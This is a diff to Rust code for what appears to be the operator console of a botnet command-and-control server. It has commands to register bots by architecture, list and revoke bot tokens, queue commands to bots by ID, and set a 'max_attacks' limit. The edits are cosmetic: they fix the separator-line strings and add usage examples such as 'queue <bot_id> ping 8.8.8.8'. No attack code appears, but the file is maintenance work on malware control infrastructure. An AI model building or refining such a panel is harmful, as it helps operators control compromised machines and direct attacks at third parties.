@@ -13,7 +13,7 @@ pub async fn handle_owner_command(client: &Arc<Client>, state: &Arc<AppState>) -
     
     let title = apply_ice_gradient("Owner Menu");
     client.write(format!("\n\r  {}\n\r", title).as_bytes()).await?;
-    client.write(b"  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r").await?;
+    client.write("  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r".as_bytes()).await?;
     
     // Owner Commands
     let owner_title = apply_ice_gradient("Owner Commands");
@@ -36,6 +36,7 @@ pub async fn handle_regbot_command(client: &Arc<Client>, state: &Arc<AppState>, 
         Some(a) => a.to_string(),
         None => {
             client.write(b"\x1b[38;5;196m[X] Usage: regbot <arch>\n\r").await?;
+            client.write(b"\x1b[38;5;245mExample: regbot x86_64\n\r").await?;
             return Ok(());
         }
     };
@@ -91,7 +92,7 @@ pub async fn handle_listbackups_command(client: &Arc<Client>) -> Result<()> {
     
     let title = apply_ice_gradient("Available Backups");
     client.write(format!("\n\r  {}\n\r", title).as_bytes()).await?;
-    client.write(b"  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r").await?;
+    client.write("  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r".as_bytes()).await?;
     
     if backups.is_empty() {
         client.write(b"  \x1b[38;5;245mNo backups found\x1b[0m\n\r").await?;
@@ -111,6 +112,7 @@ pub async fn handle_restore_command(client: &Arc<Client>, state: &Arc<AppState>,
         Some(n) => n.to_string(),
         None => {
             client.write(b"\x1b[38;5;196m[X] Usage: restore <backup_name>\n\r").await?;
+            client.write(b"\x1b[38;5;245mExample: restore backup_20230101.tar.gz\n\r").await?;
             return Ok(());
         }
     };
@@ -198,6 +200,7 @@ pub async fn handle_db_command(client: &Arc<Client>, state: &Arc<AppState>, part
         Some(a) => a.to_lowercase(),
         None => {
             client.write(b"\x1b[38;5;196m[X] Usage: db <backup|restore|clear>\n\r").await?;
+            client.write(b"\x1b[38;5;245mExample: db backup\n\r").await?;
             return Ok(());
         }
     };
@@ -252,6 +255,7 @@ pub async fn handle_db_command(client: &Arc<Client>, state: &Arc<AppState>, part
 pub async fn handle_adduser_command(client: &Arc<Client>, state: &Arc<AppState>, parts: &[&str]) -> Result<()> {
     if parts.len() < 4 {
         client.write(b"\x1b[38;5;196m[X] Usage: adduser <username> <password> <level> [days]\n\r").await?;
+        client.write(b"\x1b[38;5;245mExample: adduser newuser p@ssword123 basic 30\n\r").await?;
         return Ok(());
     }
     
@@ -291,6 +295,7 @@ pub async fn handle_deluser_command(client: &Arc<Client>, state: &Arc<AppState>,
         Some(u) => u.to_string(),
         None => {
             client.write(b"\x1b[38;5;196m[X] Usage: deluser <username>\n\r").await?;
+            client.write(b"\x1b[38;5;245mExample: deluser olduser\n\r").await?;
             return Ok(());
         }
     };
@@ -325,6 +330,7 @@ pub async fn handle_deluser_command(client: &Arc<Client>, state: &Arc<AppState>,
 pub async fn handle_changepass_command(client: &Arc<Client>, state: &Arc<AppState>, parts: &[&str]) -> Result<()> {
     if parts.len() < 3 {
         client.write(b"\x1b[38;5;196m[X] Usage: changepass <username> <new_password>\n\r").await?;
+        client.write(b"\x1b[38;5;245mExample: changepass user1 newsecret\n\r").await?;
         return Ok(());
     }
     
@@ -369,6 +375,7 @@ pub async fn handle_clearlogs_command(client: &Arc<Client>, state: &Arc<AppState
 pub async fn handle_userchange_command(client: &Arc<Client>, state: &Arc<AppState>, parts: &[&str]) -> Result<()> {
     if parts.len() < 3 {
         client.write(b"\x1b[38;5;196m[X] Usage: userchange <username> <level|expiry> <value>\n\r").await?;
+        client.write(b"\x1b[38;5;245mExample: userchange user1 level admin\n\r").await?;
         return Ok(());
     }
     
@@ -422,6 +429,7 @@ pub async fn handle_userchange_command(client: &Arc<Client>, state: &Arc<AppStat
 pub async fn handle_config_command(client: &Arc<Client>, state: &Arc<AppState>, parts: &[&str]) -> Result<()> {
     if parts.len() < 3 {
         client.write(b"\x1b[38;5;196m[X] Usage: config <key> <value>\n\r").await?;
+        client.write(b"\x1b[38;5;245mExample: config max_attacks 5\n\r").await?;
         return Ok(());
     }
     
@@ -501,7 +509,7 @@ pub async fn handle_tokens_command(client: &Arc<Client>, state: &Arc<AppState>) 
     
     let title = apply_ice_gradient("Registered Bot Tokens");
     client.write(format!("\n\r  {}\n\r", title).as_bytes()).await?;
-    client.write(b"  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r").await?;
+    client.write("  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r".as_bytes()).await?;
     
     if tokens.is_empty() {
         client.write(b"  \x1b[38;5;245mNo tokens found\x1b[0m\n\r").await?;
@@ -528,6 +536,7 @@ pub async fn handle_revoke_command(client: &Arc<Client>, state: &Arc<AppState>, 
         Some(id) => id,
         None => {
             client.write(b"\x1b[38;5;196m[X] Usage: revoke <bot_id>\n\r").await?;
+            client.write(b"\x1b[38;5;245mExample: revoke 550e8400-e29b-41d4-a716-446655440000\n\r").await?;
             return Ok(());
         }
     };
@@ -558,6 +567,7 @@ pub async fn handle_revoke_command(client: &Arc<Client>, state: &Arc<AppState>, 
 pub async fn handle_bot_queue_command(client: &Arc<Client>, state: &Arc<AppState>, parts: &[&str]) -> Result<()> {
     if parts.len() < 3 {
         client.write(b"\x1b[38;5;196m[X] Usage: queue <bot_id> <command>\n\r").await?;
+        client.write(b"\x1b[38;5;245mExample: queue 550e8400-e29b-41d4-a716-446655440000 ping 8.8.8.8\n\r").await?;
         return Ok(());
     }
     
